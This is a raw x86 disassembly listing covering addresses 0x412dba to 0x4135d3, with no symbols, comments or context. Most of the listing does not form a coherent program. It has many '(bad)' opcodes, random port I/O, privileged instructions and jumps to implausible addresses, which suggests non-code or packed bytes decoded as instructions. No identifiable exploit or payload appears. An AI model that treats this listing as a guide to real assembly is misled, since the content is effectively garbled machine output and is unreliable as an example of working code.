  412dba:	sbb    DWORD PTR [ecx-0x2344900],ecx
  412dc0:	inc    esi
  412dc2:	push   es
  412dc3:	cld    
  412dc4:	jbe    0x412dfb
  412dc6:	pop    ss
  412dc7:	cld    
  412dc8:	jmp    0x803d34f2
  412dcd:	jbe    0x412dae
  412dcf:	imul   edi,edi,0x30ff16a6
  412dd5:	sahf   
  412dd6:	jbe    0x412ddb
  412dd8:	mov    DWORD PTR [ebp+0x59],edx
  412ddb:	mov    al,BYTE PTR [esi+0x1e451]
  412de1:	xor    bl,BYTE PTR [ebx]
  412de3:	sub    BYTE PTR [ebp+edx*2-0x34],0x4
  412de8:	je     0x412e0d
  412dea:	pop    ebp
  412deb:	test   BYTE PTR ds:0xfdf319b4,0x66
  412df2:	(bad)  
  412df3:	or     al,0x87
  412df5:	in     eax,dx
  412df6:	add    ebx,DWORD PTR [edi+eax*4]
  412df9:	cmc    
  412dfa:	sti    
  412dfb:	adc    ecx,DWORD PTR [ecx-0x76dffc0b]
  412e01:	(bad)  
  412e03:	adc    ecx,DWORD PTR [ecx+0x5d1c03ed]
  412e09:	xlat   BYTE PTR ds:[ebx]
  412e0a:	adc    al,0x89
  412e0c:	push   eax
  412e0d:	xor    eax,0xb2590c69
  412e12:	or     DWORD PTR [ebx-0x19060cec],ebp
  412e18:	add    BYTE PTR ds:0x55786a22,0x4d
  412e1f:	out    0x4d,eax
  412e21:	add    BYTE PTR [eax+0x400afcda],bh
  412e27:	leave  
  412e28:	sbb    eax,0xa921ed81
  412e2d:	sbb    al,0x31
  412e2f:	xchg   esp,eax
  412e30:	and    esp,DWORD PTR [eax]
  412e32:	jno    0x412dc2
  412e34:	daa    
  412e35:	outs   dx,DWORD PTR ds:[esi]
  412e36:	sub    ecx,DWORD PTR [edi+ebp*1+0x2b8c77f5]
  412e3d:	cmp    al,0xf3
  412e3f:	add    edi,esp
  412e41:	mov    BYTE PTR [ebp+0x2d],dh
  412e44:	stos   DWORD PTR es:[edi],eax
  412e45:	jle    0x412e3d
  412e47:	pop    ebp
  412e48:	dec    ebp
  412e49:	mov    DWORD PTR [ebp+0x2d],ebx
  412e4c:	mov    ds:0x455d837e,eax
  412e51:	mov    ebp,DWORD PTR [edi+0x3103eafd]
  412e57:	push   ecx
  412e58:	jo     0x412ed8
  412e5a:	push   ecx
  412e5b:	or     eax,0x97b603e7
  412e60:	idiv   edi
  412e62:	xchg   al,ch
  412e64:	aas    
  412e65:	out    0x78,al
  412e67:	not    DWORD PTR [edx+0x31]
  412e6a:	outs   dx,BYTE PTR ds:[esi]
  412e6b:	inc    eax
  412e6c:	out    0xad,al
  412e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e6f:	or     DWORD PTR [edi-0x5845cebe],esi
  412e75:	xor    BYTE PTR [eax+ebx*1-0x6b],dh
  412e79:	mov    edx,0x4283856
  412e7e:	jle    0x412e49
  412e80:	sbb    bh,BYTE PTR [ebp+0x1809f34]
  412e86:	add    BYTE PTR [ecx],al
  412e88:	dec    edx
  412e89:	out    0xd2,eax
  412e8b:	jno    0x412ea9
  412e8d:	add    BYTE PTR [esi-0x154860cb],ch
  412e93:	bound  ebp,QWORD PTR [eax]
  412e95:	add    BYTE PTR [eax-0x1a40760e],bh
  412e9b:	popa   
  412e9c:	into   
  412e9d:	jg     0x412e2f
  412e9f:	xor    ch,al
  412ea1:	std    
  412ea2:	jmp    0xa9c4ff27
  412ea7:	xor    eax,0x32f0b98c
  412eac:	or     DWORD PTR [ecx+0x60],edx
  412eaf:	cmp    al,0x94
  412eb1:	dec    esi
  412eb2:	in     eax,0xb3
  412eb4:	retf   0x8918
  412eb7:	(bad)  
  412eb9:	mov    esi,0x933e9
  412ebe:	fs push 0xffffffe8
  412ec1:	push   esp
  412ec2:	pusha  
  412ec3:	and    ebx,DWORD PTR [edx]
  412ec5:	shr    ah,0x32
  412ec8:	or     DWORD PTR [eax],eax
  412eca:	jmp    0xae065e78
  412ecf:	scas   eax,DWORD PTR es:[edi]
  412ed0:	out    0xfd,eax
  412ed2:	jmp    0x29c23809
  412ed7:	sahf   
  412ed8:	and    al,BYTE PTR [eax]
  412eda:	in     eax,0x32
  412edc:	or     DWORD PTR [edx+0x5],esi
  412edf:	mov    bl,0xca
  412ee1:	add    ch,ah
  412ee3:	xor    cl,BYTE PTR [ecx]
  412ee5:	sub    DWORD PTR [eax],0x74f9307e
  412eeb:	add    BYTE PTR [ecx+edx*4-0x72],ah
  412eef:	(bad)  [esi-0x19]
  412ef2:	std    
  412ef3:	bound  esi,QWORD PTR [edx+ecx*4]
  412ef6:	enter  0xdce6,0x8e
  412efa:	and    al,0xe5
  412efc:	xor    cl,BYTE PTR [ecx]
  412efe:	xchg   DWORD PTR [edi+0x4d],esp
  412f01:	or     eax,DWORD PTR [eax]
  412f03:	jmp    0x45b5cd
  412f08:	dec    esp
  412f09:	or     eax,DWORD PTR [eax]
  412f0b:	mov    DWORD PTR [esi+0x18000408],esi
  412f11:	data16 cmp cl,BYTE PTR [ebx+0x40186]
  412f18:	or     BYTE PTR [eax-0x6a],ch
  412f1b:	adc    BYTE PTR [ebx+ecx*1],cl
  412f1e:	add    BYTE PTR [ecx+0x40566],cl
  412f24:	sbb    BYTE PTR [ebp+0x5],ah
  412f27:	mov    DWORD PTR [ecx+esi*1+0x1c],ecx
  412f2b:	mov    ecx,DWORD PTR [ecx+esi*1+0x54]
  412f2f:	mov    dl,dl
  412f31:	or     eax,0xacc149e
  412f36:	add    BYTE PTR [ecx],al
  412f38:	mov    dh,0xfd
  412f3a:	add    eax,DWORD PTR [eax]
  412f3c:	enter  0x8522,0x7c
  412f40:	cmp    al,0xfd
  412f42:	test   BYTE PTR [esp+ebp*1+0x15],bh
  412f46:	test   DWORD PTR [esi+0xed4],ebx
  412f4c:	inc    ecx
  412f4d:	cmp    DWORD PTR [eax+ebx*2],esp
  412f50:	add    BYTE PTR [ebx+0x6b860bcf],ah
  412f56:	adc    al,BYTE PTR [eax]
  412f58:	add    BYTE PTR ds:0x88000096,ah
  412f5e:	or     al,BYTE PTR [edi-0x7ea983bc]
  412f64:	rcr    BYTE PTR [esp+esi*1+0x126c4c87],0x3d
  412f6c:	mov    esp,eax
  412f6e:	sbb    BYTE PTR cs:[ecx+edx*1-0x4374d6a0],al
  412f76:	cs pusha 
  412f78:	mov    esp,esi
  412f7a:	stc    
  412f7b:	add    eax,DWORD PTR [eax]
  412f7d:	dec    eax
  412f7e:	pop    es
  412f7f:	dec    esp
  412f80:	and    al,0x31
  412f82:	and    BYTE PTR [esi-0x77],dl
  412f85:	lahf   
  412f86:	fadd   QWORD PTR ds:0x57fb3100
  412f8c:	and    al,0xe1
  412f8e:	add    BYTE PTR [ebp+0x4c],bh
  412f91:	push   ebp
  412f92:	cld    
  412f93:	push   ebp
  412f94:	dec    edi
  412f95:	add    BYTE PTR es:[esi-0x3e8abe3c],0xd
  412f9d:	lods   eax,DWORD PTR ds:[esi]
  412f9e:	cld    
  412f9f:	or     BYTE PTR [eax],al
  412fa1:	xor    DWORD PTR [ebx-0x2dadbb3],edi
  412fa7:	adc    eax,0x45d48d89
  412fac:	mov    DWORD PTR [ebp-0x34],ebx
  412faf:	inc    ecx
  412fb0:	xchg   DWORD PTR [ebp-0x2c],ebx
  412fb3:	sbb    eax,0xcc7d0087
  412fb8:	sbb    ecx,ebp
  412fba:	ds pop ebx
  412fbc:	inc    ebp
  412fbd:	and    al,0x7d
  412fbf:	pop    ebx
  412fc0:	jg     0x412fd6
  412fc2:	xor    eax,0xf22901f0
  412fc7:	lahf   
  412fc8:	push   esi
  412fc9:	dec    edi
  412fca:	lods   al,BYTE PTR ds:[esi]
  412fcb:	and    DWORD PTR ds:0xbf5b6334,0xffffffe8
  412fd2:	mov    dl,0x1a
  412fd4:	repnz std 
  412fd6:	mov    edx,0xb22c25a3
  412fdb:	sub    al,0x3
  412fdd:	or     eax,0x84da5
  412fe2:	xor    DWORD PTR [ebx-0x79],ebp
  412fe5:	and    al,0x2d
  412fe7:	lock add ebp,eax
  412fea:	cmc    
  412feb:	rcl    DWORD PTR ds:0x1f03100,cl
  412ff1:	aaa    
  412ff2:	cmc    
  412ff3:	rcr    DWORD PTR [ecx],cl
  412ff5:	jae    0x412fca
  412ff7:	jb     0x412feb
  412ff9:	jmp    FWORD PTR [edi]
  412ffb:	or     DWORD PTR [ebp+0x56],ebp
  412ffe:	xor    BYTE PTR [ecx],cl
  413000:	out    0x2a,eax
  413002:	cmc    
  413003:	sub    al,0xf
  413005:	add    DWORD PTR [ebp+0x3103ea50],ebp
  41300b:	xchg   edx,eax
  41300c:	sub    ebp,DWORD PTR [eax]
  41300e:	and    DWORD PTR [esi],edi
  413010:	adc    dl,cl
  413012:	cmp    BYTE PTR [ecx],0x62
  413015:	ret    0xe819
  413018:	mov    bl,0xf1
  41301a:	add    BYTE PTR [ecx+edx*4],bl
  41301d:	xor    ebp,DWORD PTR [eax]
  41301f:	pop    ecx
  413020:	cmp    al,0x38
  413022:	jge    0x413023
  413024:	nop
  413025:	scas   eax,DWORD PTR es:[edi]
  413026:	fdivr  QWORD PTR [ebp+0x38f18edc]
  41302c:	enter  0x7ef6,0x1a
  413030:	or     bh,ah
  413032:	add    edi,DWORD PTR [eax+0x2a2bcb4d]
  413038:	or     esp,esp
  41303a:	add    esi,DWORD PTR [ecx]
  41303c:	gs lock test ah,dl
  413040:	pop    es
  413041:	out    dx,al
  413042:	xchg   DWORD PTR [esi],esi
  413044:	or     bh,ah
  413046:	add    ecx,DWORD PTR [edx]
  413048:	or     esp,ecx
  41304a:	add    esi,DWORD PTR [ecx]
  41304c:	lock test BYTE PTR gs:[eax+ecx*1+0x7a687ee],dh
  413055:	out    0x3,eax
  413057:	mov    eax,0xa84c0345
  41305c:	dec    ebp
  41305d:	retf   
  41305e:	push   edi
  41305f:	test   al,0x7b
  413061:	repz pop es
  413063:	xor    DWORD PTR [ecx],ecx
  413065:	ret    0xaec4
  413068:	dec    ebp
  413069:	ret    
  41306a:	and    ebp,ecx
  41306c:	cmp    BYTE PTR [ebp+edi*1+0x76],dh
  413070:	cmp    DWORD PTR [ecx+0x4dba55],ebp
  413076:	int    0x26
  413078:	cmp    DWORD PTR [ecx-0x53a82e1],ecx
  41307e:	out    0x0,al
  413080:	popa   
  413081:	xchg   edx,eax
  413082:	dec    esp
  413083:	add    eax,0xd4c1c2d
  413088:	in     eax,dx
  413089:	pop    DWORD PTR [ecx-0x18]
  41308c:	mov    ebx,0xdfe5244c
  413091:	fs aaa 
  413093:	jb     0x413098
  413095:	aaa    
  413096:	mov    DWORD PTR [edi-0x510ab2f6],esp
  41309c:	and    DWORD PTR [edx-0x738d32b4],edx
  4130a2:	inc    esp
  4130a3:	lds    edx,FWORD PTR [esi-0x6e]
  4130a6:	inc    esp
  4130a7:	int    0x6e
  4130a9:	cmp    DWORD PTR [edi+0x62],ecx
  4130ac:	lock lock sub eax,0x89e6017e
  4130b3:	sub    eax,0xa1292d19
  4130b8:	sub    eax,0xb0b0b8cc
  4130bd:	jmp    0xd43c8efa
  4130c2:	cli    
  4130c3:	jb     0x4130b9
  4130c5:	mov    ds:0xc72df6e8,eax
  4130ca:	jmp    0x24966ce8
  4130cf:	adc    eax,0x51ce9262
  4130d4:	stos   DWORD PTR es:[edi],eax
  4130d5:	fdiv   st(5),st
  4130d7:	ss and eax,0x1da5243d
  4130dd:	ror    DWORD PTR [ecx+0x52494ead],0xb9
  4130e4:	add    BYTE PTR ds:0x881fe8d3,cl
  4130ea:	in     eax,0xfd
  4130ec:	ret    0x916a
  4130ef:	rol    DWORD PTR [eax],0x3
  4130f2:	push   esp
  4130f3:	and    al,0x58
  4130f5:	ror    DWORD PTR [edx+eiz*8-0x4232a4fd],1
  4130fc:	clc    
  4130fd:	dec    edx
  4130fe:	or     al,0x44
  413100:	and    al,0x4
  413102:	xor    al,ch
  413104:	jge    0x413146
  413106:	retf   0x2444
  413109:	inc    esp
  41310a:	or     al,0x0
  41310c:	add    BYTE PTR [eax-0x70],cl
  41310f:	sti    
  413110:	jbe    0x413142
  413112:	ss ins BYTE PTR es:[edi],dx
  413114:	and    al,0x54
  413116:	pop    ecx
  413117:	xor    BYTE PTR [ebx+0x5528314c],cl
  41311d:	cmp    DWORD PTR [esi-0x32],ebx
  413120:	call   0x3d0cb3
  413125:	add    DWORD PTR [ecx+0x24],0x44
  413129:	xchg   ebx,eax
  41312a:	aad    0x87
  41312c:	inc    esp
  41312d:	hlt    
  41312e:	inc    esi
  41312f:	push   edx
  413130:	push   eax
  413131:	and    DWORD PTR [ebx-0xd995418],0xfffffffb
  413138:	cmp    ebx,DWORD PTR [ebx+0x40245c5e]
  41313e:	pop    eax
  41313f:	or     bh,al
  413141:	test   BYTE PTR [edx],ch
  413143:	adc    al,0x1
  413145:	fadd   DWORD PTR [esi]
  413147:	add    BYTE PTR [ebp+0x49605f00],al
  41314d:	cmp    DWORD PTR [edx+ebp*1+0x44],edi
  413151:	jge    0x4130da
  413153:	pop    edi
  413154:	mov    ss,WORD PTR [esp+edx*4]
  413157:	push   es
  413158:	add    BYTE PTR [edx-0x67],ch
  41315b:	aaa    
  41315c:	dec    ebp
  41315d:	mov    edi,DWORD PTR [esi]
  41315f:	lds    ebx,FWORD PTR [ebx-0x780db00d]
  413165:	push   esp
  413166:	je     0x4131b2
  413168:	xchg   eax,ebx
  41316a:	xor    DWORD PTR [edi+0x48],esp
  41316d:	and    al,0xf1
  41316f:	popf   
  413170:	push   ecx
  413171:	mov    DWORD PTR [edi-0x8],esp
  413174:	pop    esi
  413175:	imul   BYTE PTR [esi-0x1d]
  413178:	jp     0x4131c6
  41317a:	or     eax,0xaa4f58c8
  41317f:	add    bh,BYTE PTR [edi+0x5c]
  413182:	cmp    ecx,esi
  413184:	fstp   DWORD PTR [edi+eax*2-0x3d]
  413188:	out    dx,al
  413189:	cmp    DWORD PTR [ecx+0x67],ebp
  41318c:	dec    ebp
  41318d:	and    al,0xd9
  41318f:	push   ecx
  413190:	cli    
  413191:	(bad)  
  413192:	in     eax,dx
  413193:	adc    ebx,DWORD PTR [eax]
  413195:	add    BYTE PTR [ecx],dh
  413197:	lock add ecx,ebp
  41319a:	cmp    ch,BYTE PTR [edi+0x6d]
  41319d:	and    al,0x45
  41319f:	lock inc BYTE PTR [edx+0x1eee7]
  4131a6:	mov    dl,0x84
  4131a8:	dec    DWORD PTR [edi+esi*4]
  4131ab:	inc    esi
  4131ac:	add    al,0x0
  4131ae:	add    BYTE PTR [ecx],dh
  4131b0:	addr16 push ebp
  4131b2:	and    al,0x51
  4131b4:	push   edi
  4131b5:	adc    DWORD PTR [esi*1-0xc7efe10],0x59
  4131bd:	dec    edi
  4131be:	xor    edx,0xf18152ed
  4131c4:	in     eax,dx
  4131c5:	push   ecx
  4131c6:	mov    edi,DWORD PTR [ebp+0xc]
  4131c9:	xor    BYTE PTR [edi-0x46],cl
  4131cc:	sub    ecx,ebx
  4131ce:	nop
  4131cf:	mov    eax,0x6d89ee52
  4131d4:	adc    al,0x34
  4131d6:	cmp    ebp,esi
  4131d8:	or     ebx,DWORD PTR [ecx+ecx*4]
  4131db:	std    
  4131dc:	adc    edi,DWORD PTR [eax]
  4131de:	push   edx
  4131df:	stos   BYTE PTR es:[edi],al
  4131e0:	add    DWORD PTR [ecx+0x7c],edx
  4131e3:	push   edx
  4131e4:	or     DWORD PTR [edi],ecx
  4131e6:	lock and cl,0x1e
  4131ea:	jp     0x413255
  4131ec:	lea    ebp,[ebx-0x48c3b6d9]
  4131f2:	jp     0x41325b
  4131f4:	lock adc eax,0xd2e16cf8
  4131fa:	ret    0x85be
  4131fd:	or     DWORD PTR [edx],eax
  4131ff:	xor    bh,al
  413201:	bound  edi,QWORD PTR [ebx-0x2716206a]
  413207:	sbb    esi,ecx
  413209:	shl    edi,0x44
  41320c:	loope  0x413270
  41320e:	int3   
  41320f:	test   al,0x4c
  413211:	add    ebx,DWORD PTR [eax+eax*1]
  413214:	loop   0x41324e
  413216:	jb     0x4131d6
  413218:	sbb    ebp,edx
  41321a:	mov    ah,0xed
  41321c:	and    al,0x95
  41321e:	lahf   
  41321f:	sbb    eax,ebp
  413221:	or     al,0xa0
  413223:	lods   al,BYTE PTR ds:[esi]
  413224:	push   cs
  413225:	lods   al,BYTE PTR ds:[esi]
  413226:	jb     0x413246
  413228:	add    al,0xf3
  41322a:	mov    eax,0xa8d3b8ea
  41322f:	fistp  DWORD PTR [esp+ecx*1]
  413232:	mov    eax,ds:0xbb256d79
  413237:	add    cl,bh
  413239:	and    al,0x90
  41323b:	outs   dx,DWORD PTR ds:[esi]
  41323c:	cmp    eax,ecx
  41323e:	sub    ebp,DWORD PTR [eax]
  413240:	inc    ebp
  413241:	or     ah,bh
  413243:	add    esi,DWORD PTR [ecx]
  413245:	xchg   BYTE PTR [esi+0x76],ah
  413248:	sbb    DWORD PTR [esp],esp
  41324b:	jo     0x41325a
  41324d:	xchg   esp,eax
  41324e:	mov    ebx,0xb9390127
  413253:	js     0x41323c
  413255:	icebp  
  413256:	jne    0x41324f
  413258:	lods   al,BYTE PTR ds:[esi]
  413259:	loopne 0x4132cd
  41325b:	int3   
  41325c:	mov    eax,0x3d0d0045
  413261:	cmp    al,0x50
  413263:	(bad)  
  413264:	xlat   BYTE PTR ds:[ebx]
  413265:	icebp  
  413266:	jge    0x413284
  413268:	pushf  
  413269:	fidivr WORD PTR [ecx]
  41326b:	inc    ecx
  41326c:	test   BYTE PTR [edx+eax*1-0x7ef6cd16],dl
  413273:	lea    ecx,[esi-0xb]
  413276:	push   ebp
  413278:	add    BYTE PTR [edi+0x32e902d6],dh
  41327e:	mov    bh,bl
  413280:	jmp    0x932:0xe9d48e5d
  413287:	mov    DWORD PTR ds:0x35892919,esi
  41328d:	sbb    DWORD PTR [ecx-0x77],eax
  413290:	outs   dx,DWORD PTR ds:[esi]
  413291:	es add eax,0xa0b1e900
  413297:	sti    
  413298:	sbb    BYTE PTR [eax-0x4fe4fe36],dh
  41329e:	enter  0x1901,0x9e
  4132a2:	dec    ebp
  4132a3:	and    al,0xed
  4132a5:	adc    DWORD PTR [edx-0x1f246e32],0xfffffffd
  4132ac:	sahf   
  4132ad:	mov    DWORD PTR [ebp+0x24],eax
  4132b0:	fnstcw WORD PTR [ecx+0x35]
  4132b3:	and    al,0xd5
  4132b5:	jns    0x4132f4
  4132b7:	and    al,0xd1
  4132b9:	sbb    edx,ecx
  4132bb:	push   edx
  4132bc:	jb     0x413262
  4132be:	cmp    BYTE PTR [esp+ecx*8-0x6],bh
  4132c2:	and    al,0xf3
  4132c4:	outs   dx,BYTE PTR ds:[esi]
  4132c5:	lds    edi,FWORD PTR [ebx]
  4132c7:	push   ecx
  4132c8:	jb     0x413256
  4132ca:	xchg   DWORD PTR [ebp+eax*1+0x11],eax
  4132ce:	icebp  
  4132cf:	adc    eax,0x89ddcd5c
  4132d4:	popf   
  4132d5:	push   cs
  4132d6:	and    eax,0x93590029
  4132db:	jg     0x4132bf
  4132dd:	add    BYTE PTR [ebx+0x508bc208],bl
  4132e3:	retf   
  4132e4:	cmc    
  4132e5:	add    dh,bl
  4132e7:	jmp    edi
  4132e9:	jmp    FWORD PTR [ebp*8+0x60cb55fb]
  4132f0:	into   
  4132f1:	mov    esp,ecx
  4132f3:	daa    
  4132f4:	sub    al,0xe8
  4132f6:	sbb    bl,al
  4132f8:	sti    
  4132f9:	jmp    ebx
  4132fb:	mov    ds:0x276c4487,eax
  413300:	daa    
  413301:	enter  0xa24b,0xb8
  413305:	jmp    0xf76f93f4
  41330a:	popa   
  41330b:	mov    ch,0xfa
  41330d:	mov    eax,DWORD PTR [edx+0x4b1fe5c5]
  413313:	popf   
  413314:	xchg   DWORD PTR [esp+ebp*1+0x19],eax
  413318:	inc    edi
  41331a:	xor    edi,DWORD PTR [ecx+edi*2+0x2449cf08]
  413321:	adc    al,0x9
  413323:	or     eax,DWORD PTR [eax]
  413325:	add    BYTE PTR [ebp+0x132876f2],cl
  41332b:	retf   0x247c
  41332e:	cmp    DWORD PTR [ecx],0x24
  413331:	xor    BYTE PTR [eax],bh
  413333:	aaa    
  413334:	xchg   esi,ecx
  413336:	mov    al,0x94
  413338:	hlt    
  413339:	push   DWORD PTR [edi+0xc8bd85e]
  41333f:	sub    DWORD PTR [eax],ebp
  413341:	push   ebp
  413342:	add    BYTE PTR [eax],bh
  413344:	pop    esi
  413345:	into   
  413346:	call   0x3d0cb5
  41334b:	adc    ecx,ebp
  41334d:	or     ecx,DWORD PTR [ebp+ebp*1+0x31000007]
  413354:	jae    0x4133be
  413356:	and    al,0x1d
  413358:	lock cli 
  41335a:	or     BYTE PTR [ebx-0xe],0x1
  41335e:	add    BYTE PTR [edx-0x4ba7e284],bh
  413364:	pop    ss
  413365:	stc    
  413366:	or     DWORD PTR [edx],0xfffffff1
  413369:	add    DWORD PTR [eax],eax
  41336b:	mov    dl,0x27
  41336d:	add    ecx,DWORD PTR ds:0x4a0af
  413373:	xor    DWORD PTR [ebx+0x50],ebp
  413376:	and    al,0xdd
  413378:	push   0xffffffb9
  41337a:	sub    DWORD PTR [edx+0x55],edi
  41337d:	add    BYTE PTR [edx],cl
  41337f:	sub    ah,BYTE PTR [edi]
  413381:	jb     0x413385
  413383:	stos   BYTE PTR es:[edi],al
  413384:	das    
  413385:	push   esp
  413386:	mov    ebp,ebp
  413388:	ret    
  413389:	or     eax,0x54236e29
  41338e:	mov    esi,ebp
  413390:	add    ebp,DWORD PTR [eax]
  413392:	dec    edi
  413393:	stos   BYTE PTR es:[edi],al
  413394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413395:	jl     0x4133f3
  413397:	or     eax,0x26ccdc04
  41339c:	(bad)  
  41339d:	jmp    0x6572:0x3004a537
  4133a4:	imul   ecx,DWORD PTR [ebp+0x24],0x0
  4133a8:	popa   
  4133a9:	not    DWORD PTR [ebp-0x77]
  4133ac:	push   DWORD PTR [edi+0x28]
  4133af:	hlt    
  4133b0:	push   es
  4133b1:	jg     0x413431
  4133b3:	fsubr  DWORD PTR [edx+0x5e38202b]
  4133b9:	and    BYTE PTR [ebp-0x32],bh
  4133bc:	fnstenv [ebp-0x35190213]
  4133c2:	(bad)  
  4133c3:	mov    DWORD PTR [ebp-0x34],edi
  4133c6:	or     eax,0x356b417e
  4133cb:	and    al,0x1
  4133cd:	or     DWORD PTR [edx+0x4f],esi
  4133d0:	or     eax,0x15377015
  4133d5:	and    DWORD PTR [eax+0x4f],esp
  4133d8:	or     eax,0x553f621d
  4133dd:	stc    
  4133de:	popf   
  4133df:	push   esi
  4133e0:	add    DWORD PTR [edx-0x27ab24d3],edx
  4133e6:	ss jmp 0x37e4:0x2c034ca8
  4133ee:	jb     0x4133a9
  4133f0:	mov    eax,0x80ec0fc0
  4133f5:	fst    QWORD PTR [esi]
  4133f7:	cs jo  0x413407
  4133fa:	pop    esp
  4133fb:	mov    ds:0x7ee70931,al
  413400:	add    eax,0xbf2ecf25
  413405:	and    al,0xeb
  413407:	add    esi,DWORD PTR [ecx]
  413409:	push   esp
  41340a:	(bad)  
  41340b:	jle    0x41340d
  41340d:	in     eax,0x24
  41340f:	sti    
  413410:	jl     0x4133ff
  413412:	and    al,0xf7
  413414:	push   eax
  413415:	jecxz  0x41344f
  413417:	bound  edi,QWORD PTR [edx-0x162825b7]
  41341d:	sub    al,0x37
  41341f:	sbb    bh,BYTE PTR [ebp-0x9]
  413422:	xchg   edx,eax
  413423:	and    esp,DWORD PTR [eax]
  413425:	dec    ebp
  413426:	icebp  
  413427:	lods   eax,DWORD PTR ds:[esi]
  413428:	cmc    
  413429:	adc    al,0xdd
  41342b:	bound  edi,QWORD PTR [eax]
  41342d:	push   ebp
  41342e:	and    eax,0xb8b8bbea
  413433:	xor    al,0x46
  413435:	mov    dh,0x4d
  413437:	retf   
  413438:	sbb    esp,DWORD PTR [ebx-0x70]
  41343b:	popf   
  41343c:	fsub   QWORD PTR [ecx-0x47167928]
  413442:	shl    DWORD PTR [edx+0x40],0x15
  413446:	and    DWORD PTR [eax],eax
  413448:	push   ds
  413449:	jge    0x4133dd
  41344b:	into   
  41344c:	adc    DWORD PTR [edx+0x4466fdda],0x340d246d
  413456:	ror    DWORD PTR [ecx+0x392516ad],0x2a
  41345d:	sub    al,0x3d
  41345f:	and    al,0xa1
  413461:	sbb    BYTE PTR [ecx+ebp*8-0x1b],al
  413465:	sbb    eax,0x1591243d
  41346a:	inc    ebp
  41346b:	and    al,0xf1
  41346d:	pop    ebp
  41346e:	and    DWORD PTR [ebp*8+0x73093200],0xfffffff0
  413476:	mov    ch,0x9b
  413478:	sub    ch,ch
  41347a:	xor    cl,BYTE PTR [ecx]
  41347c:	add    BYTE PTR [ebp-0x13ffdfc3],dl
  413482:	xor    cl,BYTE PTR [ecx]
  413484:	jl     0x41346a
  413486:	mov    ch,0xde
  413488:	add    bh,BYTE PTR [ebp+0xc]
  41348b:	pop    esp
  41348c:	jl     0x413453
  41348e:	sbb    cl,BYTE PTR [ecx]
  413490:	jnp    0x41347b
  413492:	xor    bl,BYTE PTR [ebp+0x3]
  413495:	push   0x49
  413497:	or     dh,BYTE PTR [edx+edi*8-0x4b]
  41349b:	dec    esp
  41349c:	and    al,0x11
  41349e:	or     BYTE PTR [ecx+ecx*4-0x49],0xa
  4134a3:	retf   
  4134a4:	icebp  
  4134a5:	mov    esi,0x6230f209
  4134aa:	outs   dx,BYTE PTR ds:[esi]
  4134ab:	and    eax,0x254e6258
  4134b0:	adc    BYTE PTR [edx-0x23],dh
  4134b3:	xor    ebp,edx
  4134b5:	cmp    esp,DWORD PTR [ebp-0x6e]
  4134b8:	into   
  4134b9:	sbb    DWORD PTR [edi-0x26710228],0x8002444
  4134c3:	test   ebx,ebp
  4134c5:	add    ebp,esp
  4134c7:	jmp    0x4c9447b3
  4134cc:	and    al,0x10
  4134ce:	ins    DWORD PTR es:[edi],dx
  4134cf:	sbb    eax,0x5c8a51fb
  4134d4:	into   
  4134d5:	call   0xfc196eda
  4134da:	call   FWORD PTR [ebx]
  4134dc:	bnd jg 0x4134dc
  4134df:	fwait
  4134e0:	loopne 0x41346e
  4134e2:	sbb    DWORD PTR [eax+0x168b0007],0x8800040c
  4134ec:	dec    edx
  4134ed:	dec    edi
  4134ee:	push   eax
  4134ef:	adc    esp,DWORD PTR [edx-0xed7e118]
  4134f5:	sti    
  4134f6:	mov    ecx,esp
  4134f8:	sti    
  4134f9:	daa    
  4134fa:	push   ebp
  4134fb:	mov    ecx,0x208bce5c
  413500:	shl    al,0xf2
  413503:	das    
  413504:	icebp  
  413505:	aaa    
  413506:	ret    
  413507:	(bad)  
  413509:	xchg   BYTE PTR [esp+eiz*2-0x1],al
  41350d:	xchg   BYTE PTR ss:[ebx+ebx*8-0x3],dh
  413512:	jmp    ebp
  413514:	fld    QWORD PTR [eax+0x920be]
  41351a:	add    BYTE PTR [eax+0x6b],cl
  41351d:	inc    ecx
  41351e:	cmp    eax,0xa18
  413523:	ins    BYTE PTR es:[edi],dx
  413524:	or     BYTE PTR [edi-0x3],bh
  413527:	or     ch,BYTE PTR [ebx+0x3]
  41352a:	cmp    eax,0x7208
  41352f:	pop    esp
  413530:	pop    ss
  413531:	xchg   DWORD PTR [esp+esi*8+0x4e],ebx
  413535:	test   DWORD PTR [esp+esi*8+0xa],ebp
  413539:	sub    ebp,0x23fc3100
  41353f:	mov    edi,eax
  413541:	aam    0xfd
  413543:	jmp    esi
  413545:	call   DWORD PTR [ecx-0x77]
  413548:	out    dx,eax
  413549:	js     0x41356e
  41354b:	lock (bad) 
  41354d:	push   ebx
  41354e:	lods   al,BYTE PTR ds:[esi]
  41354f:	dec    esi
  413551:	lock add edi,edi
  413554:	lods   al,BYTE PTR ds:[esi]
  413555:	fdiv   st(5),st
  413557:	(bad)  
  413558:	mov    esi,0x1d243ff9
  41355d:	mov    ebp,0xed0d8be1
  413562:	out    0xe9,al
  413564:	or     edx,DWORD PTR [edi+0x48]
  413567:	and    al,0xf9
  413569:	push   esi
  41356a:	inc    eax
  41356b:	and    al,0x49
  41356d:	jge    0x4135c0
  41356f:	mov    DWORD PTR [edi+0x48],edi
  413572:	add    ecx,esi
  413574:	xchg   BYTE PTR [ebx],ah
  413576:	add    ebp,DWORD PTR [esi+0x1e425]
  41357c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41357d:	xchg   esp,eax
  41357e:	or     ch,bh
  413580:	pop    edx
  413581:	int    0x7a
  413583:	pop    esp
  413584:	or     eax,0xe4fd80a8
  413589:	mov    cl,0x7a
  41358b:	dec    esp
  41358c:	or     eax,0x25967ac8
  413591:	in     al,0x1
  413593:	add    BYTE PTR [eax-0x57c3dfcc],bh
  413599:	sub    al,0x20
  41359b:	cmp    BYTE PTR [eax+0x10201c],ch
  4135a1:	jbe    0x41356a
  4135a3:	or     eax,DWORD PTR [ebx+0x45011c26]
  4135a9:	or     ch,bl
  4135ab:	jp     0x413533
  4135ad:	cmp    eax,0x620001ec
  4135b2:	add    BYTE PTR [ecx-0x32],bh
  4135b5:	sbb    DWORD PTR [ecx],ecx
  4135b7:	pop    ebp
  4135b8:	(bad)  
  4135b9:	cld    
  4135ba:	fstp   DWORD PTR [esi-0x18fae283]
  4135c0:	add    esi,DWORD PTR [edx-0x27802127]
  4135c6:	or     bh,ah
  4135c8:	add    ebx,DWORD PTR [eax]
  4135ca:	pop    ebp
  4135cb:	ret    
  4135cc:	daa    
  4135cd:	and    al,0x84
  4135cf:	mov    BYTE PTR [ebx],al
  4135d1:	xor    DWORD PTR [ecx],ecx
  4135d3:	bound  ecx,QWORD PTR [edi+0xd]
